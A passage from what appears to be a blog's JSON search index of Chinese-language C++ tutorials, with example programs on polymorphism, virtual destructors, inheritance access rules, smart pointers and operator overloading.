&lt;&lt; p &lt;&lt; endl; &#125; virtual ~A() &#123; cout &lt;&lt; \"~A()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p; &#125;;class B : public A&#123;public: B() &#123; cout &lt;&lt; \"B()...\" &lt;&lt; endl; this-&gt;p = new char[64]; memset(p, 0, 64); strcpy(p, \"B string\"); &#125; //重写 virtual void print() &#123; cout &lt;&lt; p &lt;&lt; endl; &#125; virtual ~B() &#123; cout &lt;&lt; \"~B()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p;&#125;;class C : public B&#123;public: C() &#123; cout &lt;&lt; \"C()...\" &lt;&lt; endl; this-&gt;p = new char[64]; memset(p, 0, 64); strcpy(p, \"C string\"); &#125; virtual void print() &#123; cout &lt;&lt; p &lt;&lt; endl; &#125; virtual ~C() &#123; cout &lt;&lt; \"~C()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p;&#125;;void func(A *p)//p = cp; p = &amp;c //用父类指针指向子类对象。&#123; p-&gt;print(); //在此处发生多态。 //delete p; //delete 一个父类指针 如何让delete p不是将p看做父类指针来delete 而是当子类呢 //如果类的析构函数加上了 virtual delete 就会发生多态。 delelte p 会调用C类的析构函数&#125;void myDelete(A*p) //p-&gt;cp 父类指针指向子类对象&#123; delete p; //p-&gt;~() //如果~（） 不加virtual关键 不会发生多态。 //希望delete p， p-&gt;~() 调用C类的~（） // 如果给 所有的类的析构函数加上virtual关键字 就会发生多态。&#125;void test()&#123; C c;&#125;int main(void)&#123; /* C *cp = new C; cp-&gt;print();//cp的函数 delete cp; */ cout &lt;&lt; \" ----- \" &lt;&lt; endl; C * cp1 = new C; //发生3此构造 A() B（） C() //test(); func(cp1); myDelete(cp1); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"动态联编和静态联编","slug":"cpp0049-动态联编和静态联编","date":"2021-05-12T18:27:48.000Z","updated":"2021-12-28T18:37:42.724Z","comments":true,"path":"2021/05/13/cpp0049-动态联编和静态联编/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0049-动态联编和静态联编/","excerpt":"","text":"动态联编和静态联编","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"多态的定义和多态的三个必要条件","slug":"cpp0048-多态的定义和多态的三个必要条件","date":"2021-05-12T18:11:02.000Z","updated":"2021-12-28T18:37:37.944Z","comments":true,"path":"2021/05/13/cpp0048-多态的定义和多态的三个必要条件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0048-多态的定义和多态的三个必要条件/","excerpt":"","text":"多态的定义和多态的三个必要条件 多态发生的三个必要条件 要有继承。 要有子类重写父类的虚函数 父类指针(或者引用) 指向子类对象。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Hero&#123;public: //当前Hero的战斗力是10 virtual int getAd()&#123; return 10; &#125;&#125;;//超级英雄class SuperHero :public Hero&#123;public: virtual int getAd() &#123; return 100; &#125;&#125;;class BugHero : public Hero&#123;public: virtual int getAd() &#123; return 10000; &#125;&#125;;//怪兽class Monster&#123;public: int getAd() &#123; return 30; &#125;&#125;;//战斗的函数//先写的 战斗函数， 通过用父类的指针作为参数//多态具有调用未来的 意义。void PlayerFight(Hero *hero, Monster *m)&#123; //多态这种现象较 动态联编 是迟绑定 或是 晚绑定 if (hero-&gt;getAd() &gt; m-&gt;getAd()) &#123; //在此hero-&gt;getAd()就发生了多态 cout &lt;&lt; \"英雄战胜了 叫兽\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"英雄挂了。\" &lt;&lt; endl; &#125;&#125;int main(void)&#123; Hero hero1; Monster mon1; //后写的超级英雄 SuperHero hero2; BugHero hero3; //开始战斗 PlayerFight(&amp;hero1, &amp;mon1); PlayerFight(&amp;hero2, &amp;mon1); //Hero *hero = &amp;hero2; PlayerFight(&amp;hero3, &amp;mon1); //指针的三个必要条件 int a; int*p = NULL; p = &amp;a; *p; //多态发生的三个必要条件 //1 要有继承。 //2 要有子类重写父类的虚函数 //3 父类指针(或者引用) 指向子类对象。 //int a = 10; cin &gt;&gt; a; //func(a); // if (a &gt; 10) &#123; cout &lt;&lt; a &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"a 不大于10\" &lt;&lt; endl; &#125; return 0;&#125;/*void func(int a);void func(int a, int b);*/","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"多继承与虚继承","slug":"cpp0047-多继承与虚继承","date":"2021-05-12T17:40:38.000Z","updated":"2021-12-28T18:37:29.551Z","comments":true,"path":"2021/05/13/cpp0047-多继承与虚继承/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0047-多继承与虚继承/","excerpt":"","text":"多继承与虚继承 多继承 俗话讲的,鱼与熊掌不可兼得,而在计算机就可以实现,生成一种新的对象, 叫熊掌鱼,多继承自鱼和熊掌即可。还比如生活中,“兼”。 一个类有多个直接基类的继承关系称为多继承 沙发床实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//家具类class Furniture&#123;public: int m; //材质 &#125;;//如果子类虚继承本来， 编译器会将父类中的成员， 只拷贝一份。//床类class Bed: virtual public Furniture&#123;public: void sleep() &#123; cout &lt;&lt; \"在床上睡觉\" &lt;&lt; endl; &#125;&#125;;//沙发类class Sofa :virtual public Furniture&#123;public: void sit() &#123; cout &lt;&lt; \"在沙发上睡觉\" &lt;&lt; endl; &#125;&#125;;//沙发床class SofaBed :public Bed, public Sofa&#123;public: void sitAndSleep() &#123; sit();//sofa sleep();//bed &#125;&#125;;int main(void)&#123; Bed b; b.sleep(); cout &lt;&lt; \" ---- \" &lt;&lt; endl; Sofa s; //m s.m = 100; s.sit(); cout &lt;&lt; \"------- \" &lt;&lt; endl; SofaBed sb; sb.sitAndSleep(); sb.m; //多继承如果 return 0;&#125; 虚继承 如果一个派生类从多个基类派生，而这些基类又有一个共同的基类，则 在对该基类中声明的名字进行访问时，可能产生二义性","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"继承中的static","slug":"cpp0047-继承中的static","date":"2021-05-12T17:15:14.000Z","updated":"2021-12-28T18:37:34.397Z","comments":true,"path":"2021/05/13/cpp0047-继承中的static/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0047-继承中的static/","excerpt":"","text":"继承中的static 123456789101112131415161718192021222324252627282930313233#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: static int s;private: &#125;;int A::s = 0;//静态成员变量要在类的外部初始化class B :public A&#123;public:private:&#125;;int main(void)&#123; B b; cout &lt;&lt; b.s &lt;&lt; endl; b.s = 100; cout &lt;&lt; b.s &lt;&lt; endl; cout &lt;&lt; A::s &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"父类和子类出现重名变量","slug":"cpp0046-父类和子类出现重名变量","date":"2021-05-12T17:04:05.000Z","updated":"2021-12-28T18:37:26.728Z","comments":true,"path":"2021/05/13/cpp0046-父类和子类出现重名变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0046-父类和子类出现重名变量/","excerpt":"","text":"父类和子类出现重名变量 1234567891011121314151617181920212223242526272829303132333435363738394041424344#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; &#125; int a;&#125;;class Child :public Parent&#123;public : Child(int a, int aa) : Parent(aa) &#123; this-&gt;a = a; //让Child 的a = a， 让父亲的a = aa &#125; void print() &#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; //默认是使用 当前类的重名的变量 cout &lt;&lt; \"Parent::a = \" &lt;&lt; Parent::a &lt;&lt; endl; //如果想访问父类中的重名变量 需要加上父类的作用域 &#125; int a; /* a ---&gt; Paretn::a */&#125;;int main(void)&#123; Child c(10, 100); c.print(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"子类中的构造和析构","slug":"cpp0045-子类中的构造和析构","date":"2021-05-12T16:56:24.000Z","updated":"2021-12-28T18:37:22.816Z","comments":true,"path":"2021/05/13/cpp0045-子类中的构造和析构/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0045-子类中的构造和析构/","excerpt":"","text":"子类中的构造和析构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//子类在进行初始化成员变量的时候， 如果此成员变量是继承过来的， 那么需要调用父类的构造器来初始化。class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; cout &lt;&lt; \"Parent(int a) ...\" &lt;&lt; endl; &#125; ~Parent() &#123; cout &lt;&lt; \"~Parent()...\" &lt;&lt; endl; &#125; void printA() &#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Son :public Parent&#123;public: //子类继承于父类， 父类中的成员变量 应该用 父类的构造函数来初始化 Son(int a, int b) : Parent(a) &#123; this-&gt;b = b; cout &lt;&lt; \"Son(int a, int b) ...\" &lt;&lt; endl; &#125; ~Son() &#123; //Parent p = Parent(b);//是一个新的parent对象。 cout &lt;&lt; \"~Son() ...\" &lt;&lt; endl; &#125; void printB() &#123; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; &#125; void pirntAB() &#123; Parent::printA(); this-&gt;printB(); &#125;private: int b; char *name;&#125;;void test1()&#123; Parent p(30); Son s(20, 20); // p + s独有 s.pirntAB();&#125;int main(void)&#123; test1(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类的赋值兼容原则","slug":"cpp0044-类的赋值兼容原则","date":"2021-05-12T16:44:09.000Z","updated":"2021-12-28T18:37:16.960Z","comments":true,"path":"2021/05/13/cpp0044-类的赋值兼容原则/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0044-类的赋值兼容原则/","excerpt":"","text":"类的赋值兼容原则 类型兼容性原则 类型兼容规则是指在需要基类对象的任何地方，都可以使用公有派生类 的对象来替代。通过公有继承，派生类得到了基类中除构造函数、析构函数之 外的所有成员。这样，公有派生类实际就具备了基类的所有功能，凡是基类能 解决的问题，公有派生类都可以解决。 类型兼容规则中所指的替代包括以下情况： 在替代之后，派生类对象就可以作为基类的对象使用，但是只能使用从基类继 承的成员。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;/*子类对象可以当作父类对象使用子类对象可以直接赋值给父类对象子类对象可以直接初始化父类对象父类指针可以直接指向子类对象父类引用可以直接引用子类对象*/class Parent&#123;public: void printP() &#123; cout &lt;&lt; \"Parent::printP()...\" &lt;&lt; endl; &#125; int a;&#125;;class Child :public Parent&#123;public: void printC() &#123; cout &lt;&lt; \"Child:: printC()....\" &lt;&lt; endl; &#125; int b;&#125;;void print(Parent *p)&#123; p-&gt;printP();&#125;int main(void)&#123; Child c;//子类对象 c.printP(); //子类对象可以当作父类对象使用 Parent p = c; // 由于子类拥有全部父类的内存空间，子类能够保障父类初始化完整。 //子类对象可以直接初始化父类对象 因为子类内存空间包容的父类的，能够保证 // 完全赋值。 //Child c2 = p; //父类指针可以直接指向子类对象 //子类对象能够完全满足父类指针的需求，所以可以 父类指针可以直接指向子类对象 Parent *pp = &amp;c; //pp-&gt;printP (x ) pp-&gt;printC //pp-&gt;printC(); pp-&gt;a; //不能用子类指针指向父类对象。 //父类对象满足不了子类指针的所有需求， 所以不能够 子类指针指向父类对象。 //Child *cp = &amp;p; // cp-&gt; printP, cp-&gt;printC //cp-&gt;b; //p中没有b的内存。 //此时访问b就越界了。 //cp-&gt;printP(); //cp-&gt;printC(); //父类引用可以引用子类对象 Parent &amp;pr = c; //子类引用不可以引用父类的对象。 //Child &amp;cr = p; print(&amp;p); //Parent* p = &amp;p; print(&amp;c); //Parent *p = &amp;c; //父类指针可以指向子类对象。 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类的继承方式","slug":"cpp0043-类的继承方式","date":"2021-05-12T16:25:34.000Z","updated":"2021-12-28T18:37:14.497Z","comments":true,"path":"2021/05/13/cpp0043-类的继承方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0043-类的继承方式/","excerpt":"","text":"类的继承方式 一个派生类可以同时有多个基类,这种情况称为多重继承,派生类只有一个 基类, 称为单继承。下面从单继承讲起。 继承方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//基类class Parent&#123;public: //访问控制权限 int pub; //对内部外部均可以protected: int pro;//对内，外均不可以 //protected 访问控制权限下的成员 儿子可见private: int pri;//对内外 均不可以 //父亲的情人 //private 访问控制权限下的成员 儿子不可见&#125;;class Child :public Parent //Child 公有继承 Parent&#123; void func() &#123; pro; //ok//可能是私有的和保护的。 //pri; //访问不了父亲的私有成员 &#125;&#125;;//三看原则://1 看当前的成员调用是在类的外部 还是在类的内部//2 看儿子的继承方式， 是公有继承还是 私有继承//3 看当前的成员变量在父亲中的访问控制权限class Child2 : protected Parent&#123; void func() &#123; pub; //内部 //此时pub 函数 在此类中是 protected权限 //pri; &#125;&#125;;class Child3 : private Parent&#123; void func() &#123; pub; //父亲中的public 变成 本来的私有 pro;//父亲中的pro 变成本类的私有 &#125;&#125;;class SubChild3 : public Child3&#123; void func() &#123; pub; pro; &#125;&#125;;//1 基类中的私有成员 不管子类如何继承， 子类都访问不了。//2 如果是公有(public)继承， 那么基类中的访问控制权限 出了私有成员 ，在子类中保持不变//3 如果是保护继承protected ， 那么子类中出了基类的私有成员，全部是protected权限//4 如果是私有继承 private ， 父类中除了私有成员， 在子类都是 私有成员。int main(void)&#123; Parent p; p.pub; Child c; c.pub; // Child c;// c.pro; // //c.pro; //此时pro 可能是私有的 也可能是保护的。 Child2 c2; //c2.pub; //c2.pro; //此时pro 在Child2中是一个保护权限， 在类的外部访问不了。 Child3 c3; c3.pub; c3.pro; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"有关继承的名词定义","slug":"cpp0042-有关继承的名词定义","date":"2021-05-12T16:22:59.000Z","updated":"2021-12-28T18:37:09.751Z","comments":true,"path":"2021/05/13/cpp0042-有关继承的名词定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0042-有关继承的名词定义/","excerpt":"","text":"有关继承的名词定义 类的继承,是新的类从已有类那里得到已有的特性。或从已有类产生新类 的过程就是类的派生。原有的类称为基类或父类,产生的新类称为派生类或子类。 派生与继承,是同一种意义两种称谓。 isA 的关系。 派生类的组成 派生类中的成员,包含两大部分,一类是从基类继承过来的,一类是自己增加 的成员。从基类继承过过来的表现其共性,而新增的成员体现了其个性。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"类与类之间的关系","slug":"cpp0041-类与类之间的关系","date":"2021-05-11T17:26:35.000Z","updated":"2021-12-28T18:37:06.150Z","comments":true,"path":"2021/05/12/cpp0041-类与类之间的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0041-类与类之间的关系/","excerpt":"","text":"类与类之间的关系 B has A 代表 B依赖A C use A 代表C使用A D is A 代表D包含了A 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: void funcA() &#123; cout &lt;&lt; \"func A ...\" &lt;&lt; endl; &#125;&#125;;//A对于B类 是充当一个成员变量， B has A 包含关系 A 属于Bclass B&#123;public: void funcB() &#123; a.funcA(); &#125; A a;&#125;;//如果C中某一个成员函数 是依赖于A类形参， 将A类当一个形参传递进来//C use Aclass C&#123;public: void funcC(A *a) &#123; a-&gt;funcA(); &#125;&#125;;//类D 继承于 类A//类D 继承于A 就说明 D is Aclass D : public A&#123;public: void funcD() &#123; funcA(); //直接使用A类的方法。 &#125;&#125;;int main(void)&#123; D d; d.funcA(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"自定义智能指针和重载相关操作符","slug":"cpp0040-自定义智能指针和重载相关操作符","date":"2021-05-11T16:42:23.000Z","updated":"2021-12-28T18:37:01.732Z","comments":true,"path":"2021/05/12/cpp0040-自定义智能指针和重载相关操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0040-自定义智能指针和重载相关操作符/","excerpt":"","text":"自定义智能指针和重载相关操作符 智能指针 123456789101112131415161718192021222324252627282930313233343536373839404142#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;memory&gt;using namespace std;class A&#123;public: A(); ~A(); A(int x) &#123; a = x; &#125; void printf() &#123; cout &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;void test() &#123; //智能指针,不需要手动delete auto_ptr&lt;A&gt; a(new A(10)); a-&gt;printf();&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125; 自定义智能指针和重载-&gt; *操作符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int x) &#123; a = x; cout &lt;&lt; \"A(int x)..\" &lt;&lt; endl; &#125; ~A(); int getA() &#123; return a; &#125;private: int a;&#125;;//自定义智能指针类class MyPtr&#123;public: MyPtr(); MyPtr(A * tPtr) &#123; ptr = tPtr; &#125; //重载-&gt;操作符 A * operator-&gt;() &#123; return ptr; &#125; //重载*操作符 A &amp; operator*() &#123; return *ptr; &#125; ~MyPtr();private: A * ptr;&#125;;MyPtr::MyPtr()&#123; ptr = NULL;&#125;MyPtr::~MyPtr()&#123; if (ptr != NULL) &#123; delete ptr; ptr = NULL; &#125;&#125;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;void test1() &#123; MyPtr mP(new A(20)); cout &lt;&lt; mP-&gt;getA() &lt;&lt; endl; cout &lt;&lt; (*mP).getA() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test1(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"不建议重载并且和或者操作符","slug":"cpp0039-不建议重载并且和或者操作符","date":"2021-05-11T16:01:04.000Z","updated":"2021-12-28T18:36:56.926Z","comments":true,"path":"2021/05/12/cpp0039-不建议重载并且和或者操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0039-不建议重载并且和或者操作符/","excerpt":"","text":"不建议重载并且和或者操作符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int x); ~A(); A &amp; setValue(int x); int getValue() &#123; return value; &#125; bool operator&amp;&amp;(const A &amp; ta); bool operator||(const A &amp; ta);private: int value;&#125;;A::A(int x)&#123; value = x;&#125;A &amp; A::setValue(int x)&#123; value = x; return *this;&#125;bool A::operator||(const A &amp; ta)&#123; cout &lt;&lt; \"重载了||运算符\" &lt;&lt; endl; if (value != 0 || ta.value != 0) &#123; return true; &#125; return false;&#125;bool A::operator&amp;&amp;(const A &amp; ta)&#123; cout &lt;&lt; \"重载了&amp;&amp;运算符\" &lt;&lt; endl; if (value != 0 &amp;&amp; ta.value != 0) &#123; return true; &#125; return false;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a(0), b(20); int i = 0, j = 20; //不会发生短路现象 if (a &amp;&amp; b) &#123; cout &lt;&lt; \"a &amp;&amp; b == true\" &lt;&lt; endl; &#125; if (b || a.setValue(100)) &#123; cout &lt;&lt; \"a &amp;&amp; b == true\" &lt;&lt; endl; &#125; //因为b不等于0 ,正常情况下a.setValue(100)是不会执行的,所以重载了||不会发生短路 cout &lt;&lt; a.getValue() &lt;&lt; endl; //正常发生短路,所以i和j的值不变 if (i &amp;&amp; (j = 100)); cout &lt;&lt; \"j = \" &lt;&lt; j &lt;&lt; endl; if (j || (i=20)); cout &lt;&lt; \"i = \" &lt;&lt; i &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"重载函数调用符号(仿函数)","slug":"cpp0038-重载函数调用符号-仿函数","date":"2021-05-11T15:35:37.000Z","updated":"2022-05-30T16:19:21.125Z","comments":true,"path":"2021/05/11/cpp0038-重载函数调用符号-仿函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0038-重载函数调用符号-仿函数/","excerpt":"","text":"重载函数调用符号(仿函数) 1234567891011121314151617181920212223242526272829303132333435#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); ~A(); //重载一个伪函数 int operator()(int value) &#123; return value * value; &#125;private: int a;&#125;;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a; cout &lt;&lt; a(2) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"重载new和delete","slug":"cpp0037-重载new和delete","date":"2021-05-11T15:07:33.000Z","updated":"2021-12-28T18:36:50.923Z","comments":true,"path":"2021/05/11/cpp0037-重载new和delete/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0037-重载new和delete/","excerpt":"","text":"重载new和delete 声明语法 12345void * operator new(size_t size);void * operator new[](size_t size);void operator delete[](void *p);void operator delete(void * p); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int t) &#123; test = t; &#125; ~A(); /* 重载了new 和 delete后,一样会调用构造函数和析构函数 */ void * operator new(size_t size); void * operator new[](size_t size); void operator delete[](void *p); void operator delete(void * p);private: size_t _size; int test;&#125;;void A::operator delete[](void * p)&#123; free(p);&#125;void * A::operator new[](size_t size)&#123; return malloc(size);&#125;void A::operator delete(void * p)&#123; free(p);&#125;void * A::operator new(size_t size)&#123; cout &lt;&lt; size &lt;&lt; endl; return malloc(size);&#125;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; A * a = new A();//a.operator new(sizeof(A)) //初始化一个new A数组 A * b = new A[10]&#123;(10),(20),(30)&#125;; delete[] b; delete a; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"重载数组下标运算符","slug":"cpp0036-重载数组下标运算符","date":"2021-05-11T14:36:36.000Z","updated":"2021-12-28T18:36:46.202Z","comments":true,"path":"2021/05/11/cpp0036-重载数组下标运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0036-重载数组下标运算符/","excerpt":"","text":"重载数组下标运算符 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class ArrayInt&#123;public: ArrayInt(); ArrayInt(int x); //重载数组下标操作符 int &amp; operator[](int x); int getSize() &#123; return size; &#125; ~ArrayInt();private: int * array; int size;&#125;;//重载数组下标操作符int &amp; ArrayInt::operator[](int x)&#123; return array[x];&#125;ArrayInt::ArrayInt(int x)&#123; size = x; array = new int[size];&#125;ArrayInt::ArrayInt()&#123; if (array != NULL) &#123; delete[] array; size = 0; &#125;&#125;ArrayInt::~ArrayInt()&#123;&#125;int main(char *argv[], int argc)&#123; ArrayInt num(300); for (int i = 0; i &lt; num.getSize(); i++) &#123; num[i] = i; &#125; for (int i = 0; i &lt; num.getSize(); i++) &#123; cout &lt;&lt; num[i] &lt;&lt; \" \"; if (i % 10 == 0 &amp;&amp; i != 0) cout &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"等号操作符重载","slug":"cpp0035-等号操作符重载","date":"2021-05-11T14:24:40.000Z","updated":"2021-12-28T18:36:43.342Z","comments":true,"path":"2021/05/11/cpp0035-等号操作符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0035-等号操作符重载/","excerpt":"","text":"等号操作符重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Student&#123;public: Student(); Student(const char * tname); Student(const Student &amp; s); ~Student(); //重载赋值运算符 Student &amp; operator=(const Student &amp; s); friend ostream &amp; operator&lt;&lt;(ostream &amp; cout ,const Student &amp; s); static long long sid;private: char * name; int nameLen; long long id;&#125;;long long Student::sid = 10000000;//操作赋值操作符Student &amp; Student::operator=(const Student &amp; s)&#123; //首先判断是不是本身 if (&amp;s == this) &#123; return *this; &#125; //判断是否为空,如果不为空,就将自身开辟的空间释放掉 if (this-&gt;name != NULL) &#123; delete[] this -&gt; name; this -&gt; name = NULL; &#125; //执行深拷贝 this-&gt;nameLen = s.nameLen; this -&gt; name = new char[this-&gt;nameLen + 1]; strcpy(this-&gt;name,s.name); this-&gt;id = s.id; return *this;&#125;//拷贝构造函数Student::Student(const Student &amp; s)&#123; nameLen = s.nameLen; id = s.id; cout &lt;&lt; Student::sid &lt;&lt; endl; if (s.name == NULL) &#123; name = NULL; return; &#125; name = new char[nameLen + 1]; strcpy(name, s.name);&#125;ostream &amp; operator&lt;&lt;(ostream &amp; cout, const Student &amp; s)&#123; if (s.name == NULL) &#123; cout &lt;&lt; \"学号为\"&lt;&lt;s.id&lt;&lt;\"该学生无效\" &lt;&lt; endl; return cout; &#125; cout &lt;&lt;\"姓名:\" &lt;&lt; s.name &lt;&lt; endl; cout &lt;&lt;\"学号:\" &lt;&lt; s.id &lt;&lt; endl; cout &lt;&lt; \"====================\" &lt;&lt; endl; return cout;&#125;Student::Student(const char * tname)&#123; nameLen = strlen(tname); id = ++sid; name = new char[nameLen + 1]; strcpy(name,tname);&#125;Student::Student()&#123; name = NULL; nameLen = 0; id = ++sid;&#125;Student::~Student()&#123; if (sid &gt; 10000000) &#123; --sid; &#125; if (name != NULL) &#123; cout &lt;&lt; name &lt;&lt; \" 0x\" &lt;&lt; (int *)name &lt;&lt; \" 已被析构\" &lt;&lt; endl; delete[] name; name = NULL; &#125;else cout &lt;&lt; \"NULL\" &lt;&lt; \" 0x\" &lt;&lt; (int *)name &lt;&lt; \" 已被析构\" &lt;&lt; endl; &#125;int main(char *argv[], int argc)&#123; Student s1, s2(\"XiaoMing\"); cout &lt;&lt; s1 &lt;&lt; s2 &lt;&lt; endl; s1 = s2; cout &lt;&lt; s1 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"左移右移操作符重载","slug":"cpp0034-左移右移操作符重载","date":"2021-05-11T12:30:59.000Z","updated":"2021-12-28T18:36:38.404Z","comments":true,"path":"2021/05/11/cpp0034-左移右移操作符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0034-左移右移操作符重载/","excerpt":"","text":"左移右移操作符重载 重载左移 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class C&#123;public: C(); C(int ta,int tb); ~C(); //友元重载左移&lt;&lt;运算符 friend ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another);private: int a; int b;&#125;;//友元重载左移&lt;&lt;运算符ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another)&#123; cout &lt;&lt; another.a &lt;&lt; endl; cout &lt;&lt; another.b &lt;&lt; endl; cout &lt;&lt; \"==================\" 